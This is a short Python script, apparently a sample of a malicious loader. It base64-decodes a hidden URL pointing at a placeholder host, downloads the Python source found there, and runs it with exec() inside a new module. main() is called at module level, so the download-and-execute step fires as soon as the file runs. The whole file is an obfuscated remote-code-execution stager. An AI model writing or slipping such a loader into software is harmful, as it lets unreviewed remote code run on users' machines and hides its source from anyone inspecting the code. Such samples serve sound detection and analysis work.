import urllib.request
import base64
import types

def get_url():
    encoded_url = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUxLnB5"
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    return decoded_url

def get_response(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def create_module():
    return types.ModuleType("sm1")

def execute_code(src, module):
    exec(src, module.__dict__)

def main():
    url = get_url()
    source = get_response(url)
    module = create_module()
    execute_code(source, module)

main()
